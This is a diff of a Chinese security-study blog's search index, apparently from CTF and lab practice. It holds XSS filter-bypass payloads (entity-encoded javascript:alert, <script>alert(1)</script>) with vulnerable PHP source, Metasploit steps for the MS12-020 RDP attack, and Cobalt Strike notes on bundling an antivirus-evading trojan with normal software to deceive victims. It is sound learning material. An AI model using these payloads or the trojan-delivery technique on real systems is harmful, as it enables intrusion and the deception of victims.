-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
-<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
-<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
-<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
-<p>部分源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>xss</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>在线网址</title>
     <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
@@ -490,75 +550,6 @@ return $outText;#新值
         <tag>加密解密</tag>
         <tag>其它工具</tag>
         <tag>学习网址</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透工具</title>
-    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="一、nmp"><a href="#一、nmp" class="headerlink" title="一、nmp"></a>一、nmp</h2><h3 id="1-nmap是什么"><a href="#1-nmap是什么" class="headerlink" title="1.nmap是什么"></a>1.nmap是什么</h3><p>是一款检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息的专业工具</p>
-<h3 id="2-运行环境"><a href="#2-运行环境" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
-<h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3.功能"></a>3.功能</h3><ol>
-<li><p>主机发现功能：向目标计算机发送特制的数据包组合，然后根据目标的反应来确定它是否处于开机并连接到网络的状态。</p>
-</li>
-<li><p>端口扫描：向目标计算机的指定端口发送特制的数据包组合，然后根据目标端口的反应来判断它是否开放。</p>
-</li>
-<li><p>服务及版本检测：向目标计算机的目标端口发送特制的数据包组合，然后根据目标的反应来检测它运行服务的服务类型和版本。</p>
-</li>
-<li><p>操作系统检测：向目标计算机发送特制的数据包组合，然后根据目标的反应来检测它的操作系统类型和版本。</p>
-</li>
-</ol>
-<h3 id="3-简单用法"><a href="#3-简单用法" class="headerlink" title="3.简单用法"></a>3.简单用法</h3><p>参数为：</p>
-<p>-sS：syn半开扫描，隐蔽性强<br>        -sY：全开扫描，比较准确<br>        -sT：会大量记录日志，慎用<br>        -sP：主机存活才会扫描的ping扫描<br>        -sA：高级扫描，穿透防火墙规则过滤<br>        -sV：版本探针扫描<br>        -Pn：被禁ping扫描方法<br>        -A：全面扫描</p>
-<p>nmap ip确定目标主机在线情况及端口基本状况</p>
-<h2 id="二、msf-Metaploit"><a href="#二、msf-Metaploit" class="headerlink" title="二、msf(Metaploit)"></a>二、msf(Metaploit)</h2><h3 id="1-msf是什么"><a href="#1-msf是什么" class="headerlink" title="1.msf是什么"></a>1.msf是什么</h3><p>msf是一个框架，附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p>
-<p>kali已经自带了。</p>
-<h3 id="2-运行环境-1"><a href="#2-运行环境-1" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
-<h3 id="3-功能模块"><a href="#3-功能模块" class="headerlink" title="3.功能模块"></a>3.功能模块</h3><ol>
-<li><p>Auxiliary（辅助模块）：为渗透测试信息搜集提供了大量的辅助模块支持</p>
-</li>
-<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
-</li>
-<li><p>Payload（攻击载荷模块）：攻击成功后促使靶机运行的一段植入代码</p>
-</li>
-<li><p>Post （后渗透攻击模块）：收集更多信息或进一步访问被利用的目标系统</p>
-</li>
-<li><p>Encoders（编码模块）</p>
-</li>
-<li><p>将攻击载荷进行编码，来绕过防护软件拦截</p>
-</li>
-</ol>
-<h3 id="4-简单使用（蓝屏攻击）"><a href="#4-简单使用（蓝屏攻击）" class="headerlink" title="4.简单使用（蓝屏攻击）"></a>4.简单使用（蓝屏攻击）</h3><p>靶机可作为winxp，kali作为攻击机，两者同一局域网下。</p>
-<p>winxp需要：</p>
-<p>-开启3389端口（系统远程桌面服务）</p>
-<p>-未安装蓝屏攻击补丁</p>
-<p>-关闭防火墙</p>
-<h4 id="a-先端口探测"><a href="#a-先端口探测" class="headerlink" title="a)先端口探测"></a>a)先端口探测</h4><p><code>nmap -sS -Pn -A 目标ip</code></p>
-<p>确认开放了3389端口。</p>
-<h4 id="b-进入msf，serch-ms12-020"><a href="#b-进入msf，serch-ms12-020" class="headerlink" title="b)进入msf，serch ms12_020"></a>b)进入msf，serch ms12_020</h4><p>出现两个模块，第一个为漏洞利用模块，第二个为漏洞验证模块</p>
-<h5 id="1）验证"><a href="#1）验证" class="headerlink" title="1）验证"></a>1）验证</h5><p><code>use auxiliary/scanner/rdp/ms12_020_check</code>进入漏洞验证模块</p>
-<p>输入<code>show options</code>查看相关参数配置</p>
-<p>一般需要配置rhosts，<code>set rhosts 目标ip</code>后</p>
-<p>输入run运行即可</p>
-<p>会显示The target is vulnerable，证明该主机漏洞存在</p>
-<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong>即可</p>
-<h2 id="三、cobalt-strike"><a href="#三、cobalt-strike" class="headerlink" title="三、cobalt strike"></a>三、cobalt strike</h2><h3 id="1-cs是什么"><a href="#1-cs是什么" class="headerlink" title="1.cs是什么"></a>1.cs是什么</h3><p>渗透测试神器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。</p>
-<p>本质是c2（command&amp;control），类似于teamserver发布命令，client执行命令，远控</p>
-<h3 id="2-运行环境-2"><a href="#2-运行环境-2" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>一般是kali启动teamserver服务（有java的linux平台），主机运行客户端（java环境）。客户端所填的ip地址就是kali的地址。正常实战时，cs隐藏特征和流量混淆一下，免杀。</p>
-<h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>将木马放到目标机：</p>
-<p>先将木马放到本地，做好免杀后，传到getshell的目标服务器上中去。（一般将木马与正常软件捆绑成一个压缩包，发给受害者，受害者在不知情的情况下打开）。当目标机运行后，本地就可以监听到，进行提权操作后，可执行其他命令。</p>
-<p>参考：[内网渗透工具CobaltStrike使用教程详解_cobaltstrike教程_归去来兮-zangcc的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request_id%22:%22168437783916800211513558%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168437783916800211513558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=cobalt">https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request%5Fid%22%3A%22168437783916800211513558%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168437783916800211513558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=cobalt</a> strike&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p>[ Cobalt Strike使用教程——基础篇_Captain_RB的博客-CSDN博客](<a href="https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&request_id=&biz_id=102&utm_term=cobalt">https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=cobalt</a> strike&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-3-116843274.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>漏扫工具。</p>
-]]></content>
-      <categories>
-        <category>渗透工具</category>
-        <category>漏扫工具</category>
-      </categories>
-      <tags>
-        <tag>msf</tag>
-        <tag>nmap</tag>
-        <tag>cs</tag>
-        <tag>Nessus</tag>
       </tags>
   </entry>
   <entry>
@@ -649,6 +640,16 @@ return $outText;#新值
 <p>输入admin,welcome</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121649512.png" alt="image-20230516121649512"></p>
 <h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>当url上各种绕过尝试失效时，应该要联想到其它注入方式，如Cookie注入等。</p>
+<h1 id="三、XSS"><a href="#三、XSS" class="headerlink" title="三、XSS"></a>三、XSS</h1><p>这关进入到了留言板页面，全部输入框都写进xss代码，确实存在。目的是获取cookie。</p>
+<p>给每个框框试了一下</p>
+<script>alert(1)</script>
+
+<p>存在xss漏洞。</p>
+<p>xss平台搭建参照：<a href="https://www.cnblogs.com/Cl0ud/p/12176961.html">搭建xss-platform平台 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520205909377-1684589650280-1.png"></p>
+<p>再生成payload进行注入即可。</p>
+<p>但是我的平台没收到。</p>
+<p>尝试用dvwa的xss漏洞时，都可以收到，但是封神台上失败。</p>
 ]]></content>
       <categories>
         <category>靶场演练</category>
@@ -657,6 +658,75 @@ return $outText;#新值
         <tag>sql注入</tag>
         <tag>靶场</tag>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透工具</title>
+    <url>/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="一、nmp"><a href="#一、nmp" class="headerlink" title="一、nmp"></a>一、nmp</h2><h3 id="1-nmap是什么"><a href="#1-nmap是什么" class="headerlink" title="1.nmap是什么"></a>1.nmap是什么</h3><p>是一款检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息的专业工具</p>
+<h3 id="2-运行环境"><a href="#2-运行环境" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
+<h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3.功能"></a>3.功能</h3><ol>
+<li><p>主机发现功能：向目标计算机发送特制的数据包组合，然后根据目标的反应来确定它是否处于开机并连接到网络的状态。</p>
+</li>
+<li><p>端口扫描：向目标计算机的指定端口发送特制的数据包组合，然后根据目标端口的反应来判断它是否开放。</p>
+</li>
+<li><p>服务及版本检测：向目标计算机的目标端口发送特制的数据包组合，然后根据目标的反应来检测它运行服务的服务类型和版本。</p>
+</li>
+<li><p>操作系统检测：向目标计算机发送特制的数据包组合，然后根据目标的反应来检测它的操作系统类型和版本。</p>
+</li>
+</ol>
+<h3 id="3-简单用法"><a href="#3-简单用法" class="headerlink" title="3.简单用法"></a>3.简单用法</h3><p>参数为：</p>
+<p>-sS：syn半开扫描，隐蔽性强<br>        -sY：全开扫描，比较准确<br>        -sT：会大量记录日志，慎用<br>        -sP：主机存活才会扫描的ping扫描<br>        -sA：高级扫描，穿透防火墙规则过滤<br>        -sV：版本探针扫描<br>        -Pn：被禁ping扫描方法<br>        -A：全面扫描</p>
+<p>nmap ip确定目标主机在线情况及端口基本状况</p>
+<h2 id="二、msf-Metaploit"><a href="#二、msf-Metaploit" class="headerlink" title="二、msf(Metaploit)"></a>二、msf(Metaploit)</h2><h3 id="1-msf是什么"><a href="#1-msf是什么" class="headerlink" title="1.msf是什么"></a>1.msf是什么</h3><p>msf是一个框架，附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p>
+<p>kali已经自带了。</p>
+<h3 id="2-运行环境-1"><a href="#2-运行环境-1" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
+<h3 id="3-功能模块"><a href="#3-功能模块" class="headerlink" title="3.功能模块"></a>3.功能模块</h3><ol>
+<li><p>Auxiliary（辅助模块）：为渗透测试信息搜集提供了大量的辅助模块支持</p>
+</li>
+<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
+</li>
+<li><p>Payload（攻击载荷模块）：攻击成功后促使靶机运行的一段植入代码</p>
+</li>
+<li><p>Post （后渗透攻击模块）：收集更多信息或进一步访问被利用的目标系统</p>
+</li>
+<li><p>Encoders（编码模块）</p>
+</li>
+<li><p>将攻击载荷进行编码，来绕过防护软件拦截</p>
+</li>
+</ol>
+<h3 id="4-简单使用（蓝屏攻击）"><a href="#4-简单使用（蓝屏攻击）" class="headerlink" title="4.简单使用（蓝屏攻击）"></a>4.简单使用（蓝屏攻击）</h3><p>靶机可作为winxp，kali作为攻击机，两者同一局域网下。</p>
+<p>winxp需要：</p>
+<p>-开启3389端口（系统远程桌面服务）</p>
+<p>-未安装蓝屏攻击补丁</p>
+<p>-关闭防火墙</p>
+<h4 id="a-先端口探测"><a href="#a-先端口探测" class="headerlink" title="a)先端口探测"></a>a)先端口探测</h4><p><code>nmap -sS -Pn -A 目标ip</code></p>
+<p>确认开放了3389端口。</p>
+<h4 id="b-进入msf，serch-ms12-020"><a href="#b-进入msf，serch-ms12-020" class="headerlink" title="b)进入msf，serch ms12_020"></a>b)进入msf，serch ms12_020</h4><p>出现两个模块，第一个为漏洞利用模块，第二个为漏洞验证模块</p>
+<h5 id="1）验证"><a href="#1）验证" class="headerlink" title="1）验证"></a>1）验证</h5><p><code>use auxiliary/scanner/rdp/ms12_020_check</code>进入漏洞验证模块</p>
+<p>输入<code>show options</code>查看相关参数配置</p>
+<p>一般需要配置rhosts，<code>set rhosts 目标ip</code>后</p>
+<p>输入run运行即可</p>
+<p>会显示The target is vulnerable，证明该主机漏洞存在</p>
+<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong>即可</p>
+<h2 id="三、cobalt-strike"><a href="#三、cobalt-strike" class="headerlink" title="三、cobalt strike"></a>三、cobalt strike</h2><h3 id="1-cs是什么"><a href="#1-cs是什么" class="headerlink" title="1.cs是什么"></a>1.cs是什么</h3><p>渗透测试神器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。</p>
+<p>本质是c2（command&amp;control），类似于teamserver发布命令，client执行命令，远控</p>
+<h3 id="2-运行环境-2"><a href="#2-运行环境-2" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>一般是kali启动teamserver服务（有java的linux平台），主机运行客户端（java环境）。客户端所填的ip地址就是kali的地址。正常实战时，cs隐藏特征和流量混淆一下，免杀。</p>
+<h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>将木马放到目标机：</p>
+<p>先将木马放到本地，做好免杀后，传到getshell的目标服务器上中去。（一般将木马与正常软件捆绑成一个压缩包，发给受害者，受害者在不知情的情况下打开）。当目标机运行后，本地就可以监听到，进行提权操作后，可执行其他命令。</p>
+<p>参考：[内网渗透工具CobaltStrike使用教程详解_cobaltstrike教程_归去来兮-zangcc的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request_id%22:%22168437783916800211513558%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168437783916800211513558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=cobalt">https://blog.csdn.net/weixin_43847838/article/details/125069147?ops_request_misc=%7B%22request%5Fid%22%3A%22168437783916800211513558%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168437783916800211513558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125069147-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=cobalt</a> strike&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p>[ Cobalt Strike使用教程——基础篇_Captain_RB的博客-CSDN博客](<a href="https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&request_id=&biz_id=102&utm_term=cobalt">https://blog.csdn.net/Captain_RB/article/details/116843274?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=cobalt</a> strike&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-3-116843274.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>漏扫工具。</p>
+]]></content>
+      <categories>
+        <category>渗透工具</category>
+        <category>漏扫工具</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+        <tag>nmap</tag>
+        <tag>cs</tag>
+        <tag>Nessus</tag>
       </tags>
   </entry>
   <entry>
